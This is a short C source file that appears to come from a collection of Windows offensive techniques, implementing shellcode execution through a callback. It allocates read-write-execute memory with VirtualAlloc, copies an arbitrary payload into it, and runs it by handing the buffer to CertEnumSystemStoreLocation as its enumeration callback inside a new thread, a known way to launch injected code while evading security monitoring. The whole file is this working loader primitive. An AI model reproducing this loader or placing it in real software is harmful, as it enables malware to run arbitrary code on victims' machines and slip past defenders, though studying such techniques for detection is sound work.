#include "Win32Helper.h"

VOID InvokeCertEnumSystemStoreLocationThreadCallbackRoutine(LPVOID lpParameter)
{
	CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)lpParameter);
}

BOOL MpfSceViaCertEnumSystemStoreLocation(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeCertEnumSystemStoreLocationThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}